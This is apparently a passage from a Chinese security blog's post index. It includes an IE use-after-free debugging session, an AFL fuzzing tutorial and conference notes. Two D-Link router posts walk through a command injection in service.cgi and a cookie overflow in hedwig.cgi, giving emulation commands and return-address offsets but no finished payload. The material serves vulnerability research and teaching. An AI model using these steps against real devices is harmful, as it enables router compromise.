004bec08 0268eba8 mshtml!CTreeNode::ComputeFormatsHelper+0x440268eb98 65bba0ed 004bec08 004bec08 0268ebb8 mshtml!CTreeNode::GetFancyFormatIndexHelper+0x110268eba8 65bba0d4 004bec08 004bec08 0268ebc4 mshtml!CTreeNode::GetFancyFormatHelper+0xf0268ebb8 65a3b9c4 004bec08 0268ebd4 65a3ba2c mshtml!CTreeNode::GetFancyFormat+0x350268ebc4 65a3ba2c 00000000 004bec08 0268ebe4 mshtml!ISpanQualifier::GetFancyFormat+0x5a0268ebd4 65aac009 00000000 0044e908 0268ec1c mshtml!SLayoutRun::HasInlineMbp+0x100268ebe4 65abb4e5 00000000 00000000 0044e908 mshtml!SRunPointer::HasInlineMbp+0x56 eip变成了0x00000000，从栈中也看不出什么 开启页堆 1gflags.exe /i iexplore.exe +hpa 这时候是mov出的错 123456789100:013&gt; gModLoad: 6a640000 6a6f2000 C:\\Windows\\System32\\jscript.dll(d5c.a94): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=669b5100 ebx=079d2fb0 ecx=082d1fc8 edx=00000000 esi=045eee50 edi=00000000eip=6663c400 esp=045eee24 ebp=045eee3c iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246mshtml!CElement::Doc:6663c400 8b01 mov eax,dword ptr [ecx] ds:0023:082d1fc8=???????? 我们看看这个地址的属性 123456789101112131415161718192021222324252627282930313233343536370:005&gt; !heap -p -a ecx address 082d1fc8 found in _DPH_HEAP_ROOT @ 151000 in free-ed allocation ( DPH_HEAP_BLOCK: VirtAddr VirtSize) 8360b60: 82d1000 2000 6c3a90b2 verifier!AVrfDebugPageHeapFree+0x000000c2 77465674 ntdll!RtlDebugFreeHeap+0x0000002f 77427aca ntdll!RtlpFreeHeap+0x0000005d 773f2d68 ntdll!RtlFreeHeap+0x00000142 7753f1ac kernel32!HeapFree+0x00000014 664cb9a8 mshtml!CGenericElement::`vector deleting destructor&apos;+0x0000003d 66647dd0 mshtml!CBase::SubRelease+0x00000022 6663c482 mshtml!CElement::PrivateRelease+0x0000002a 6663b034 mshtml!PlainRelease+0x00000025 6669669d mshtml!PlainTrackerRelease+0x00000014 6a64a6f1 jscript!VAR::Clear+0x0000005f 6a666d66 jscript!GcContext::Reclaim+0x000000b6 6a664309 jscript!GcContext::CollectCore+0x00000123 6a6c8572 jscript!JsCollectGarbage+0x0000001d 6a6574ac jscript!NameTbl::InvokeInternal+0x00000141 6a654ea4 jscript!VAR::InvokeByDispID+0x0000017f 6a65e3e7 jscript!CScriptRuntime::Run+0x00002b80 6a655c9d jscript!ScrFncObj::CallWithFrameOnStack+0x000000ce 6a655bfb jscript!ScrFncObj::Call+0x0000008d 6a655e11 jscript!CSession::Execute+0x0000015f 6a65612a jscript!COleScript::ExecutePendingScripts+0x000001bd 6a65c2d9 jscript!COleScript::ParseScriptTextCore+0x000002a4 6a65c0f1 jscript!COleScript::ParseScriptText+0x00000030 665f68c7 mshtml!CScriptCollection::ParseScriptText+0x00000218 665f66bf mshtml!CScriptElement::CommitCode+0x000003ae 665f6c35 mshtml!CScriptElement::Execute+0x000000c6 665d82b5 mshtml!CHtmParse::Execute+0x0000004a 665b77cf mshtml!CHtmPost::Broadcast+0x0000000f 665b7f36 mshtml!CHtmPost::Exec+0x000005f7 665b8a99 mshtml!CHtmPost::Run+0x00000015 665b89fd mshtml!PostManExecute+0x000001fb 665b7c66 mshtml!PostManResume+0x000000f7 我们可以看到in free-ed allocation，这是已经free掉了的，明显的uaf 我们再看看，可以看到mshtml!CGenericElement::vector deleting destructor&#39; ，确实是这个对象的释放后重用","categories":[],"tags":[{"name":"IE漏洞","slug":"IE漏洞","permalink":"https://www.giantbranch.cn/tags/IE漏洞/"},{"name":"UAF漏洞","slug":"UAF漏洞","permalink":"https://www.giantbranch.cn/tags/UAF漏洞/"}]},{"title":"BUGSCAM功能实现跟踪解读","slug":"BUGSCAM功能实现跟踪解读","date":"2018-05-21T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2018/05/21/BUGSCAM功能实现跟踪解读/","link":"","permalink":"https://www.giantbranch.cn/2018/05/21/BUGSCAM功能实现跟踪解读/","excerpt":"","text":"这是一个idc的脚本，其实跟C语言很像，可以用于静态漏洞挖掘 首先入口是run_analysis.idc 总体流程 InitGlobVarArr：初始化全局Array SetGlobStr：设置FILENAME为我们的bin文件（通过GetInputFile()实现） 打开bugscam.conf配置文件（配置文件储存的是审计特定函数的idc脚本的相对路径） SetGlobDword将NUMBER_OF_LIBRARY_FUNCS初始化为0 循环读取并编译特定的idc脚本，并调用对应的audit函数，之后将NUMBER_OF_LIBRARY_FUNCS+1 最后关闭bugscam.conf文件并生成报告 审计过程下面以strcpy为例说明 整体 先设置全局变量FUNCTION_NAME为strcpy 通过LocByName获得该函数的地址（经过测试是在最后extern那里的地址），如果找不到就退出了 生成一个空的ref格式 真正地去寻找调用strcpy的地方，如果那个位置的为call，则调用子审计函数 有点奇怪的是除了代码交叉引用之外，还使用了数据交叉引用 最后如果审计出有问题，这调用gen_probtbl， 子审计函数 先打印现在审计的函数与call的地址 获取目标地址和源地址的arg size，还有整个函数的buf size 处理分析不出目标地址和源地址的arg size的情况 如果目标size小于源地址size，那就很可能溢出（根据不同情况，可能性不同） 最后假如审计出有问题就将NUMBER_OF_PROBLEMS+1","categories":[],"tags":[{"name":"漏洞挖掘工具","slug":"漏洞挖掘工具","permalink":"https://www.giantbranch.cn/tags/漏洞挖掘工具/"},{"name":"阅读源码","slug":"阅读源码","permalink":"https://www.giantbranch.cn/tags/阅读源码/"}]},{"title":"路由器漏洞分析入门：D-Link Service.Cgi远程命令执行漏洞","slug":"路由器漏洞分析入门：D-Link Service.Cgi远程命令执行漏洞","date":"2018-05-15T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2018/05/15/路由器漏洞分析入门：D-Link Service.Cgi远程命令执行漏洞/","link":"","permalink":"https://www.giantbranch.cn/2018/05/15/路由器漏洞分析入门：D-Link Service.Cgi远程命令执行漏洞/","excerpt":"","text":"在正在到来的物联网时代，路由器是一个家庭里面的核心，连接着各种智能设备，路由器会被更多的黑客盯上，用于发动DDos，传播木马、病毒、挖矿软件等。本文以D-Link路由器的一个远程命令执行漏洞为例带你入门路由器漏洞分析。 本文首发在绿盟科技博客：http://blog.nsfocus.net/router-vulnerability/ 环境 attifyOS:智能设备固件分析环境（下载：https://github.com/adi0x90/attifyos ） 固件二进制文件DIR-645_FIRMWARE_1.03.ZIP (下载：ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/DIR-645_FIRMWARE_1.03.ZIP ) 环境启动 运行fat.py 输入你下载的zip的路径，在输入下brand就可以了 最后再就是输入user firmadyne的密码，密码也是firmadyne 如果不是root用户运行还会输入用户密码 最后即可启动成功 访问192.168.0.1即可 漏洞分析先解压，再解开固件（M是递归扫描的意思，e是extract，提取的意思） 12unzip DIR-645_FIRMWARE_1.03.ZIPbinwalk -Me dir645_FW_103.bin 那就可以得到固件的根目录 1234/home/oit/firmware/_dir645_FW_103.bin.extracted/squashfs-root [oit@ubuntu] [1:22]&gt; ls bin etc htdocs lib proc sys usr wwwdev home include mnt sbin tmp var 只有htdocs里面和web相关的二进制程序，实际的bin程序基本都是调用busybox 跟进htdocs看看两个bin文件都是mips 32的elf文件，fileaccess.cgi是权限控制相关的 1234567/home/oit/firmware/_dir645_FW_103.bin.extracted/squashfs-root/htdocs [oit@ubuntu] [2:06]&gt; file cgibin cgibin: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked (uses shared libs), stripped/home/oit/firmware/_dir645_FW_103.bin.extracted/squashfs-root/htdocs [oit@ubuntu] [2:06]&gt; file fileaccess.cgifileaccess.cgi: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked (uses shared libs), stripped 漏洞在cgibin文件里面，IDA打开，main函数判断假如访问的是service.cgi就调用servicecgi_main servicecgi_main里面先判断请求的方法，只处理get和post（其实后面都是走一样的路径，所以这个get和post利用都可以），之后是调用cgibin_parse_request，解析CONTENT_TYPE，CONTENT_LENGTH 之后便是解析参数，其中EVENT跟SERVICE都是会调用lxmldbc_system 而lxmldbc_system会调用system执行command，而且是没有任何过滤的，那就存在命令注入的风险了 那么我们得到一种命令执行的挖掘方法就是：通过system反向解引用就可以了 漏洞利用访问一下http://192.168.0.1/service.cgi（具体ip根据实际修改），是可以访问的 最后即可利用 如果是利用SERVICE字段就得加个ACTION参数 referencehttps://cr0n1c.wordpress.com/2018/01/08/exploiting-cheap-labor/","categories":[],"tags":[{"name":"路由器","slug":"路由器","permalink":"https://www.giantbranch.cn/tags/路由器/"},{"name":"远程命令执行漏洞","slug":"远程命令执行漏洞","permalink":"https://www.giantbranch.cn/tags/远程命令执行漏洞/"}]},{"title":"DEFCON China 参会感受与要点记录","slug":"DEFCON China 参会感受与要点记录","date":"2018-05-13T00:00:00.000Z","updated":"2023-10-13T13:14:33.054Z","comments":true,"path":"2018/05/13/DEFCON China 参会感受与要点记录/","link":"","permalink":"https://www.giantbranch.cn/2018/05/13/DEFCON China 参会感受与要点记录/","excerpt":"","text":"DEFCON这个黑客大会来到中国（黑客界的奥斯卡这么一个高大上的会），估计很多人都很想去，但由于距离，门票，时间等因素，当然很多想去的人都没有去。 我当然也是想去的那一群人中的一个，之后竟然有个偶然的机会，别人给了张票，哈哈，开心~ 其实这次大会给我的感觉并不太行，所以只参加了第一天和第三天，其实是第二天权衡了一下，还是选择出去徒步耍一下。 首先是选址选得太远了，选在了昆泰酒店，方向是北京东北方向，北五环旁边，望京东地铁站附近，本来我以为国家会议中心已经够远的了……。 议题开始的时间比较晚，中间不会休息，第一天第一个议题12点（好像我们不用吃饭似的），跟着后面的议题就是直下到18点，后面两天最早的议题是10点（或许跟这酒店比较远也是挂钩的，早的话就会没人，哈哈）。 感觉门票严重超售，主会场一开始很快就爆满了，结果是估计200多号人在旁边的屋子看直播，你想想买票了过来看直播是什么感受，所以还是国家会议中心爽啊，这酒店场地费估计也不便宜，因为看到好像住宿的话是1000+一晚。 还有就是要吐槽一下那些HACK VILLAGE和WORKSHOPS，这些的选址就更小了，能进去个50人就不错了，所以每当你想进去的时候，很多火爆的都是满人不给进了。 其实这次大会整体的议题的质量整体来说没有想象中高。 说了那么多的不足，当然也要说一下好的地方，先抑后扬嘛？ 你可以看到很多外国佬，哈哈~，外国佬们很有分享精神，在VILLAGE的时候，会主动过来讲解，指导，很热情。 好像也没啥了。。。。。。 那接下来简单写一下听了的议题吧 第一天第一天没有听《用谷歌传播恶意软件》，《你上了我的账号》 《当内存安全语言形同虚设》 这个就是说Rust，go等语言是内存安全的，那么是不是就不会出现uaf等漏洞呢，议题以Rust为例，由于Rust编写的应用，有些还是使用了libc库，所以还可以出现内存安全问题，里面举了个例子就是比如用Rust写的sqlite，利用之前杨坤他们挖的sqlite漏洞也能使这个Rust编写的sqlite发生SegmentFault 实际的要点就是安全的语言，用了不安全的库 有趣的是有个提问者问演讲者：你们有挖到Rust这些可以利用的漏洞吗？答曰：没有~ 《5年搭建CTF上的经验》 演讲者为2013年-2017年间的DEF CON CTF组织者，讲了defcon ctf的一些历史，历史上的组织者，也发了自己的在8年前自己参加ctf时做出一道题目的时候高兴的样子，主要讲了从团队建设开始，组建多元化的一个团队，每个人都有自己擅长的地方，剩下的地方就差不多是吹水啦~ 《Triton 和符号执行在 GDB 上》 这个的话就是演讲者简单介绍了下符号执行，之后介绍自己的工具，即在gdb写了插件，调用Triton，具体可以看这个，感觉干简单ctf比较方便，大家可以看看 https://github.com/SQLab/symgdb 回来后发现这个在hitcon讲过了的。。。，晕 https://hitcon.org/2017/CMT/slide-files/d2_s1_r0.pdf 《几种通用的安卓平台路径穿越漏洞的挖掘与利用姿势》 这个没太认真听，印象比较深的是这两个 比如解压压缩包到sd卡可能目录穿越 有时候文件名不能为../../test.txt的时候，可以用hook的形式修改，演讲者就hook了qq，发送了这样一个含../的文件，那么接收方就被目录穿越了，这个他们报给tx了 更多的可以看ppt的Where to find Directory traversal，我懒得贴出来了 ppt https://media.defcon.org/DEF%20CON%20China%201/DEF%20CON%20China%201%20presentations/DEFCON-China-B-Xiang-General-ways-to-find-and-exploit-path-traversal-vulnerabilities-on-Android.pdf 第三天这天的议题2点就结束了 《从灰色访客到重要盟友：论亚洲及全球的黑客社区的演变》 前面就是吹吹水，跟着说一个全球性的社区其实是少于3个的， 最重要的有一点就是：（只是大概是这个意思）提问蠢一时，不提问蠢一世 这就说明了提问和交流的重要性了，而且通过VILLAGE和WORKSHOPS，外国人还是非常具有极客精神的，毫无保留地分享，交流，互助。 PPT在此，哈哈 https://media.defcon.org/DEF%20CON%20China%201/DEF%20CON%20China%201%20presentations/DEFCON-China-B-Jayson-E-Street-sphereny.pdf 《内网入侵:跨源资源共享的安全问题(CORS)》 这个是干货较多的一个了 由于浏览器的同源策略，对于网络访问来说：在不同源的情况下，能发送请求，但是不能够接收到响应 这个其实还是比较宽松的了，所以这是造成CSRF的根源了 所以后来为了跨域，出现了JSONP，JSONP(JSON with Padding) 是 json 的一种”使用模式”，可以让网页从别的域名（网站）那获取资料，即跨域读取数据。 JSONP不安全就出现了CORS，其实我觉得可以理解为给同源策略加个白名单 主要将的就是如果服务端配置不安全，有可能可以跨域，甚至直接打到内网主机 具体的安全问题可以看下面的github的Misconfiguration types，配置为*是最坑的，相当于直接将浏览器的同源策略给干掉了，哈哈 如果要挖这方面的漏洞，直接上工具，哈哈一些大的网站估计都被他搞过了估计 https://github.com/chenjj/CORScanner 《路上Wi-Fi欲断魂：攻击SmartCfg无线配网方案》和《我是格鲁特：Windows 10的安全护卫队》 中午出去吃饭了，后面那个听了点，但是没啥印象 《Androsia : 保证Android程序中‘正在使用的数据’安全》 一开始就说Data in Process可能是最不安全的，作者实现Androsia去保护这个正在使用的数据，通过插桩的方式实现的，大概好像是，只要这个变量已经不用了，就马上回收（释放） 具体大家可以看ppt，我也没它懂，而且暂时安卓不是我的关注点。。。。。。 ppt https://media.defcon.org/DEF%20CON%20China%201/DEF%20CON%20China%201%20presentations/DEFCON-China-Samit-Anwer-Androsia-Securing-Data-in-Process-for-Android.pdf 最后说了那么多，其实感觉最大的收获就是知道了开锁的原理，尝试开了下只有两个弹珠的锁，哈哈~","categories":[],"tags":[{"name":"defcon","slug":"defcon","permalink":"https://www.giantbranch.cn/tags/defcon/"},{"name":"黑客大会","slug":"黑客大会","permalink":"https://www.giantbranch.cn/tags/黑客大会/"}]},{"title":"铁三数据赛+企业赛必看必收藏必实践的文章","slug":"铁三数据赛+企业赛必看必收藏必实践的文章","date":"2018-05-08T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2018/05/08/铁三数据赛+企业赛必看必收藏必实践的文章/","link":"","permalink":"https://www.giantbranch.cn/2018/05/08/铁三数据赛+企业赛必看必收藏必实践的文章/","excerpt":"","text":"这个是在校的时候打的比赛了，收集一下资源给师弟师妹们 基础 流量分析-CTF题目实战 必看必实践 流量分析-企业渗透过程 模拟企业流量入侵溯源分析 铁三数据赛的问题及答案 https://github.com/WangYihang/t3sec-network-flow-analysis 某个人的系列总结 信息安全铁人三项赛总决赛总结(企业赛) 信息安全铁人三项赛总决赛(数据赛)第二题 信息安全铁人三项赛总决赛(数据赛)第三题 信息安全铁人三项赛总决赛(数据赛)第四题","categories":[],"tags":[{"name":"信息安全铁人三项","slug":"信息安全铁人三项","permalink":"https://www.giantbranch.cn/tags/信息安全铁人三项/"},{"name":"数据分析赛","slug":"数据分析赛","permalink":"https://www.giantbranch.cn/tags/数据分析赛/"},{"name":"wireshark","slug":"wireshark","permalink":"https://www.giantbranch.cn/tags/wireshark/"}]},{"title":"AFL fuzz工具初探","slug":"AFL fuzz工具初探","date":"2018-05-06T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2018/05/06/AFL fuzz工具初探/","link":"","permalink":"https://www.giantbranch.cn/2018/05/06/AFL fuzz工具初探/","excerpt":"","text":"下载 &amp;&amp; 安装1234wget http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgztar -xvf ./afl-latest.tgzcd afl-2.52b/sudo make &amp;&amp; sudo make install 安装成功 123456789101112131415161718192021222324252627282930root@giant:~# afl-fuzz afl-fuzz 2.52b by &lt;lcamtuf@google.com&gt;afl-fuzz [ options ] -- /path/to/fuzzed_app [ ... ]Required parameters: -i dir - input directory with test cases -o dir - output directory for fuzzer findingsExecution control settings: -f file - location read by the fuzzed program (stdin) -t msec - timeout for each run (auto-scaled, 50-1000 ms) -m megs - memory limit for child process (50 MB) -Q - use binary-only instrumentation (QEMU mode)Fuzzing behavior settings: -d - quick &amp; dirty mode (skips deterministic steps) -n - fuzz without instrumentation (dumb mode) -x dir - optional fuzzer dictionary (see README)Other stuff: -T text - text banner to show on the screen -M / -S id - distributed mode (see parallel_fuzzing.txt) -C - crash exploration mode (the peruvian rabbit thing)For additional tips, please consult /usr/local/share/doc/afl/README. 有源码fuzz——upx由于我们用afl来fuzz，这个有源码的要用afl-gcc来编译，所以编辑Makefile文件 123git clone https://github.com/upx/upx.gitcd upx/vim Makefile 添加：CC = /usr/local/bin/afl-gcc （我直接在第一行加） 12cd ./srcvim Makefile 修改： CXX ?= /usr/local/bin/afl-g++ （应该在31行） 此外，我们还需要安装编译依赖的东西，github文档有说：https://github.com/upx/upx/blob/master/README.SRC 那个zlib一般都会有的，很多linux其实默认自带upx了 如果没有的话，ubuntu是这个 1apt install zlib1g zlib1g-dev 安装lzma-sdk 123456789root@giant:~/aflfuzz/fuzztarget/upx# git submodule update --init --recursiveSubmodule &apos;src/lzma-sdk&apos; (https://github.com/upx/upx-lzma-sdk.git) registered for path &apos;src/lzma-sdk&apos;Cloning into &apos;src/lzma-sdk&apos;...remote: Counting objects: 439, done.remote: Total 439 (delta 0), reused 0 (delta 0), pack-reused 439Receiving objects: 100% (439/439), 334.46 KiB | 0 bytes/s, done.Resolving deltas: 100% (151/151), done.Checking connectivity... done.Submodule path &apos;src/lzma-sdk&apos;: checked out &apos;426fe82d122e2cf140a86751055ee523378fe2ef&apos; 安装ucl 12345wget http://www.oberhumer.com/opensource/ucl/download/ucl-1.03.tar.gztar -xvf ./ucl-1.03.tar.gzcd ucl-1.03/./configure &amp;&amp; sudo make &amp;&amp; sudo make installexport UPX_UCLDIR=/path/to/ucl-1.03 # ！！！！！你自己的路径啊 最后到我们编译upx了 1root@giant:~/aflfuzz/fuzztarget/upx# make all 最后编译生成的文件在src目录下的upx.out 我们用ida打开就可以看到不同了 开始fuzz（下面用file文件作为样本） 123root@giant:~/aflfuzz/fuzztarget/upx# mkdir afl_in afl_outroot@giant:~/aflfuzz/fuzztarget/upx# cp /usr/bin/file afl_inroot@giant:~/aflfuzz/fuzztarget/upx# afl-fuzz -i afl_in -o afl_out ./src/upx.out @@ 对了，还需要开启core dump 1echo core &gt;/proc/sys/kernel/core_pattern 刚开跑就15个崩溃了 无源码fuzz对无源码的程序进行fuzz一般有两种方法: 对二进制文件进行插桩 使用-n选项进行传统的fuzz测试 第一种由afl-qemu实现，如果使用第二种方法，把-Q改成-n就行 编译一个AFL版的qemu 12345root@giant:~/aflfuzz/afl-2.52b# cd qemu_mode/root@giant:~/aflfuzz/afl-2.52b/qemu_mode# lsbuild_qemu_support.sh patches README.qemuroot@giant:~/aflfuzz/afl-2.52b/qemu_mode# ./build_qemu_support.sh root@giant:~/aflfuzz/afl-2.52b/qemu_mode#cp ../afl-qemu-trace /usr/local/bin/ 如果缺少libtool 1apt install libtool-bin 无源码fuzz —— readelf同样也是创建文件夹，放入原始样本（test你自己准备吧） 1234mkdir afl_in afl_outmv test ./afl_in/cp /usr/bin/readelf .afl-fuzz -i afl_in -o afl_out -Q ./readelf -a @@ referencehttp://pwn4.fun/2017/09/21/AFL%E6%8A%80%E6%9C%AF%E4%BB%8B%E7%BB%8D/https://www.cnblogs.com/WangAoBo/p/8280352.html","categories":[],"tags":[{"name":"fuzz","slug":"fuzz","permalink":"https://www.giantbranch.cn/tags/fuzz/"},{"name":"afl","slug":"afl","permalink":"https://www.giantbranch.cn/tags/afl/"},{"name":"工具","slug":"工具","permalink":"https://www.giantbranch.cn/tags/工具/"},{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"https://www.giantbranch.cn/tags/漏洞挖掘/"}]},{"title":"D-Link DIR-815 路由器多次溢出分析","slug":"D-Link_DIR-815_路由器多次溢出分析","date":"2018-05-03T00:00:00.000Z","updated":"2023-10-13T13:14:33.054Z","comments":true,"path":"2018/05/03/D-Link_DIR-815_路由器多次溢出分析/","link":"","permalink":"https://www.giantbranch.cn/2018/05/03/D-Link_DIR-815_路由器多次溢出分析/","excerpt":"","text":"beforeexploitdb链接：https://www.exploit-db.com/exploits/33863/ 简要分析我们根据描述可以看到漏洞是hedwig.cgi在处理过长的cookie出现的漏洞 我们下载固件并binwalk解压 ftp://54.187.190.227/PRODUCTS/DIR-815/REVA/DIR-815_FIRMWARE_1.01.ZIP 可以看到这个cgi实际是指向cgibin程序 12giant@ubuntu:~/learn/ch10/_DIR-815_FW_1.01b14_1.01b14.bin.extracted/squashfs-root/htdocs/web$ ll hedwig.cgi lrwxrwxrwx 1 giant giant 14 May 2 19:44 hedwig.cgi -&gt; /htdocs/cgibin 这是一个mips 32位小端的程序（MSB大端，LSB小端） 12giant@ubuntu:~/learn/ch10/_DIR-815_FW_1.01b14_1.01b14.bin.extracted/squashfs-root/htdocs/web$ file ../cgibin ../cgibin: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped 用ida打开cgibin，就是判断你访问的是哪个cgi，接着去对应的函数处理 我们找到hedwig.cgi的处理函数为hedwigcgi_main，函数只处理post请求，接着读取/etc/config/image_sign获取固件的sign（其实就是路由的型号），后面就是构造xml的操作，只看外层没看到处理cookie的函数 第二个方法就是字符串搜索cookie，有个HTTP_COOKIE的字符串（因为CGI编程可以通过getenv(“HTTP_COOKIE”)来获得cookie，所以有编程基础还是很重要的），解引用是在sess_get_uid函数里面，而且hedwigcgi_main调用了这个函数 而且根据这个函数名和里面的逻辑，我们的cookie应该是uid=xxx的形式 而而且hedwigcgi_main函数获取到cookie后的sprintf很可能是造成溢出的函数 其实下面还有个sprintf函数，说不定是那个函数，这可能要取决于真正的路由器上有没有/var/tmp/这个目录（当然这里实际的路由器是有的） 调试最重要有一点是没讲的，复制库到当前的目录，先查看需要哪些 12345678910111213giant@ubuntu:~/learn/ch10/_DIR-815_FW_1.01b14_1.01b14.bin.extracted/squashfs-root$ cp $(which qemu-mipsel) ./qemu-mipselgiant@ubuntu:~/learn/ch10/_DIR-815_FW_1.01b14_1.01b14.bin.extracted/squashfs-root$ ldd ./qemu-mipsel linux-vdso.so.1 =&gt; (0x00007ffcbef94000) libgmodule-2.0.so.0 =&gt; /usr/lib/x86_64-linux-gnu/libgmodule-2.0.so.0 (0x00007fe77af4e000) libglib-2.0.so.0 =&gt; /lib/x86_64-linux-gnu/libglib-2.0.so.0 (0x00007fe77ac3a000) librt.so.1 =&gt; /lib/x86_64-linux-gnu/librt.so.1 (0x00007fe77aa32000) libm.so.6 =&gt; /lib/x86_64-linux-gnu/libm.so.6 (0x00007fe77a6dc000) libgcc_s.so.1 =&gt; /lib/x86_64-linux-gnu/libgcc_s.so.1 (0x00007fe77a4c5000) libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fe77a2a6000) libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe779ec6000) libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe779cc2000) libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007fe779a50000) /lib64/ld-linux-x86-64.so.2 (0x00007fe77d5b4000) 正式复制 12345678910111213mkdir -p ./usr/lib/mkdir -p ./lib/x86_64-linux-gnu/mkdir -p ./lib64/cp -p /usr/lib/x86_64-linux-gnu/libgmodule-2.0.so.0 ./usr/lib/cp -p /lib/x86_64-linux-gnu/libglib-2.0.so.0 ./lib/x86_64-linux-gnu/cp -p /lib/x86_64-linux-gnu/librt.so.1 ./lib/x86_64-linux-gnu/cp -p /lib/x86_64-linux-gnu/libm.so.6 ./lib/x86_64-linux-gnu/cp -p /lib/x86_64-linux-gnu/libgcc_s.so.1 ./lib/x86_64-linux-gnu/cp -p /lib/x86_64-linux-gnu/libpthread.so.0 ./lib/x86_64-linux-gnu/cp -p /lib/x86_64-linux-gnu/libc.so.6 ./lib/x86_64-linux-gnu/cp -p /lib/x86_64-linux-gnu/libdl.so.2 ./lib/x86_64-linux-gnu/cp -p /lib/x86_64-linux-gnu/libpcre.so.3 ./lib/x86_64-linux-gnu/cp -p /lib64/ld-linux-x86-64.so.2 ./lib64/ 启动并传递环境变量等待调试 1giant@ubuntu:~/learn/ch10/_DIR-815_FW_1.01b14_1.01b14.bin.extracted/squashfs-root$ sudo chroot ./ ./qemu-mipsel -E CONTENT_LENGTH=20 -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E REQUEST_METHOD=&quot;POST&quot; -E HTTP_COOKIE=`python -c &quot;print &apos;uid=123&apos;+&apos;A&apos;*0x600&quot;` -E REQUEST_URI=&quot;/hedwig.cgi&quot; -E REMOTE_ADDR=&quot;192.168.1.1&quot; -g 23946 ./htdocs/web/hedwig.cgi 打开ida远程attach上去，可以看到执行完sobj_get_string后，v0的值已经指向uid的值了 上图中的s5的注释写错了，s5为sobj_new的返回值覆盖，而且s5并不是sprintf的第一个参数，他是sobj_get_string的第一个参数，因为mips的流水线执行，先执行了jalr后面的一条，再执行jalr 真正的参数1是s1 我们跟随s1，可以看到已经格式化好了，且覆盖的是栈上的地址 我们先看看假如没有创建/var/tmp/的时候的情况，那肯定会跳到这边来 最后返回的时候从栈上取值，就把$ra给覆盖了 而实际的路由中是存在/var/tmp/目录的，所以上面这条路径是有问题的，我们建立这个目录，重新调试 由于xml里面没有数据，最终还是不能执行到那 那我们随便写点东西到temp.xml里面 123456&lt;note&gt; &lt;to&gt;George&lt;/to&gt; &lt;from&gt;John&lt;/from&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;&lt;/note&gt; 但由于下面的haystack还是0，所以最终还是进入不了那个分支，不知作者当时是怎么搞的 123456.text:004096D4.text:004096D4 loc_4096D4:.text:004096D4 lw $v0, haystack.text:004096DC nop.text:004096E0 bnez $v0, loc_4096F0.text:004096E4 lui $v0, 0x42 漏洞利用注：那这次利用就按没有/var/tmp目录来 先用gef生成2000个测试字符并准备调试 1sudo chroot ./ ./qemu-mipsel -E CONTENT_LENGTH=20 -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E REQUEST_METHOD=&quot;POST&quot; -E HTTP_COOKIE=`python -c &quot;print &apos;uid=AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAs&apos;&quot;` -E REQUEST_URI=&quot;/hedwig.cgi&quot; -E REMOTE_ADDR=&quot;192.168.1.1&quot; -g 23946 ./htdocs/web/hedwig.cgi 调试结果 s0偏移1007， ra偏移1043 123456789gef? pattern offset 0x6161636B[+] Searching &apos;0x6161636B&apos;[+] Found at offset 1007 (little-endian search) likely[+] Found at offset 237 (big-endian search) gef➤ pattern offset 0x61616C6B[+] Searching &apos;0x61616C6B&apos;[+] Found at offset 1043 (little-endian search) likely[+] Found at offset 1137 (big-endian search) 由于路由应该没有开启aslr，所以用的基址+偏移的形式调用system tips关闭很难关掉的qemu 1ps -aux | grep mips |grep -v grep | awk &apos;&#123;print $2&#125;&apos; | sudo xargs kill -9 